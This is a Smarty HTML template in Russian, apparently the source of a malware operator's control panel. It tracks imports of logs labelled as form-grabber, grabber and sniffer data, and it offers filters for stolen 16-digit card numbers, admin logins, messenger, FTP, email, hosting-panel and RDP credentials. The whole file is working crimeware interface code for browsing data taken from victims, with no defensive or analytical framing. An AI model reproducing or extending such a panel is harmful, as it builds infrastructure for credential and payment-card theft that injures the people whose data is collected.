<table cellpadding="0" cellspacing="0" border="0" style="width:100%;"><tr>

<td id="child_content" align="center"><hr />---> ---> ---> ---> ---> ---> Сделайте выбор ---> ---> ---> ---> ---> --->

{if $counts}
<hr />
<font color="#FF0000">Сейчас идет импорт</font>
<hr />
<div style="color:#999999">
Дата старта: {$tdate.post_date}
<hr />
Прошло: {$tdate.diff}
<hr />
Примерно осталось: {$tdate.ostr}
<hr />
Обработано: {$counts.obra} из {$counts.all} ({$counts.allp}%)
<hr />
Объем: {$size.1|size_format} из {$size.2|size_format} ({$size.3|size_format})
<hr />
Обрабатывается: {$counts.2} ({$size.4|size_format})
<hr />
Осталось: {$counts.ost} ({$counts.ostp}%)
<hr />
С ошибкой: {$counts.3} ({$counts.errp}%)
</div>
<hr />

<div class="top_menu" style="font-size: 14px; margin-top:20px; margin-bottom:20px"><a href="#" onclick="update_logs();">Обновить</a></div>

{if $threads|@count gt 0}
<table cellspacing="1" cellpadding="5" style="width: 100%; border: 1px solid #cccccc; text-align:center">
<tr class="bg4" style="border: 1px solid #FFFFFF; height: 25px; font-size:13px">
    <td style="width: 90px">Файл</td>
    <td style="width: 210px">Инфо</td>
    <td style="width: 70px">Тип</td>
    <td style="width: 70px">Хозяин</td>
    <td style="width: 150px">Время</td>
</tr>
{foreach from=$threads item=t name=t}
{if $smarty.foreach.t.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF">
    <td>{$t->file|basename}</td>
    <td>Размер: {$t->size|size_format}<br />Обработано: {$t->sizep|size_format}</td>
    <td>{if $t->type eq 5}ФормГраббер{elseif $t->type eq 6}Граббер{elseif $t->type eq 7}Снифер{/if}</td>
    <td>{if $t->unnecessary eq ''}{$admins[$t->post_id]}{else}Неисполь. домен<br />({$t->unnecessary}){/if}</td>
    <td> Работает: {$t->wdate}<br />
      Обновлено: {$t->udate}</td>
</tr>
{/foreach}
</table>
{/if}
{/if}
</td>
<td id="sub_menu">
{strip}
<ul id="cats" class="filetree">
<li style="font-weight:bold">Список доступных фильтров {if $smarty.session.user->access.catalog.index eq on}<a href="/catalog/"><img src="/images/edit.png" title="изменить" alt="изменить" /></a>{/if}</li>
<li><span class="file" id="c_search" onclick="get_window('/logs/search.html?window=1', {ldelim}name: 'search'{rdelim});">Глобальный поиск</span></li>
<li><span class="file" id="c_search" onclick="get_window('/logs/global_dl.html?window=1', {ldelim}name: 'global_dl'{rdelim});">Глобальная загрузка</span></li>
<li><span class="file" id="c_unnecessary" onclick="get_window('/logs/unnecessary.html?window=1', {ldelim}name: 'unnecessary',height: 650{rdelim});">Не использованные домены</span></li>
<li><span class="file" id="c_savelog" onclick="get_window('/logs/savelog.html?window=1', {ldelim}name: 'savelog',height: 650{rdelim});">Сохраненные логи</span></li>
<li><span class="file" id="c_digits" style="cursor: pointer" onclick="get_window('/logs/digits.html?window=1', {ldelim}name: 'digits',width: 700,height: 650{rdelim});">Цифры (16 цифр)</span></li>
<li><span class="file" id="c_digits" style="cursor: pointer" onclick="get_window('/logs/admins.html?window=1', {ldelim}name: 'admins',width: 700,height: 650{rdelim});">Поиск ADM</span></li>
{foreach from=$catalog item=cat1 name=cat1}
{if $cat1->host ne ''}
	<li><span class="file" id="c_{$cat1->id}" onclick="get_hax({ldelim}url: '/logs/logs-{$cat1->id}.html?ajax=1', id: 'child_content'{rdelim});">{$cat1->name}</span></li>
{else}
	<li><span class="folder">{$cat1->name}</span>
	{foreach from=$cat1->sub item=cat2 name=cat2}
    {if $smarty.foreach.cat2.first}<ul>{/if}
    {if $cat2->host ne ''}
    	<li><span class="file" id="c_{$cat2->id}" onclick="get_hax({ldelim}url: '/logs/logs-{$cat2->id}.html?ajax=1', id: 'child_content'{rdelim});">{$cat2->name}</span></li>
    {else}
    	<li><span class="folder">{$cat2->name}</span>
        {foreach from=$cat2->sub item=cat3 name=cat3}
        {if $smarty.foreach.cat3.first}<ul>{/if}
        {if $cat3->host ne ''}
        	<li><span class="file" id="c_{$cat3->id}" onclick="get_hax({ldelim}url: '/logs/logs-{$cat3->id}.html?ajax=1', id: 'child_content'{rdelim});">{$cat3->name}</span></li>
        {else}
        	<li><span class="folder">{$cat3->name}</span>
            {foreach from=$cat3->sub item=cat4 name=cat4}
            {if $smarty.foreach.cat4.first}<ul>{/if}
            <li><span class="file" id="c_{$cat4->id}" onclick="get_hax({ldelim}url: '/logs/logs-{$cat4->id}.html?ajax=1', id: 'child_content'{rdelim});">{$cat4->name}</span></li>
            {if $smarty.foreach.cat4.last}</ul>{/if}
            {/foreach}
            </li>
        {/if}
        {if $smarty.foreach.cat3.last}</ul>{/if}
        {/foreach}
        </li>
    {/if}
    {if $smarty.foreach.cat2.last}</ul>{/if}
    {/foreach}
	</li>
{/if}
{/foreach}
<li><span class="file" id="c_messengers" onclick="get_hax({ldelim}url: '/logs/logs.html?str=messengers&amp;ajax=1', id: 'child_content'{rdelim});">Мессанджеры</span></li>
<li><span class="file" id="c_ftps" onclick="get_hax({ldelim}url: '/logs/logs.html?str=ftps&amp;ajax=1', id: 'child_content'{rdelim});">ФТП Клиенты</span></li>
<li><span class="file" id="c_emailprograms" onclick="get_hax({ldelim}url: '/logs/logs.html?str=emailprograms&amp;ajax=1', id: 'child_content'{rdelim});">Почтовые программы</span></li>
<li><span class="file" id="c_panels" onclick="get_hax({ldelim}url: '/logs/logs.html?str=panels&amp;ajax=1', id: 'child_content'{rdelim});">Хостинг панели</span></li>
<li><span class="file" id="c_rdp" onclick="get_hax({ldelim}url: '/logs/logs.html?str=rdp&amp;ajax=1', id: 'child_content'{rdelim});">Remote Desktop Connection</span></li>
</ul>
{/strip}
</td>

</tr></table>

<script language="javascript" type="application/javascript">
$("#cats").treeview({ldelim}animated: "fast",collapsed: true,persist: "cookie",cookieId: "logs-treeview"{rdelim});
</script>